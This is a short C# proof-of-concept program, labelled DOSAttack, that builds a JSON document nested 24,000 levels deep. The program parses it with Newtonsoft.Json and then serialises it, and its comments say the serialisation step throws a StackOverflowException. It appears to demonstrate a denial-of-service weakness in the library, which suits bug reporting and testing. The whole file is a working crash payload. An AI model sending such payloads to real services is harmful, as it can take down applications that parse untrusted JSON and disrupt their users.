using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace DOSAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            int nRep = 24000;
            string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
                          string.Concat(Enumerable.Repeat("}", nRep));

            //Parse this object (Parsing works well - no exception is being thrown)
            var parsedJson = JObject.Parse(json);

            using (var ms = new MemoryStream())
            using (var sWriter = new StreamWriter(ms))
            using (var jWriter = new JsonTextWriter(sWriter))
            {
                //Trying to serialize the object will result in StackOverflowException !!!
                parsedJson.WriteTo(jWriter);
            }
        }
    }
}
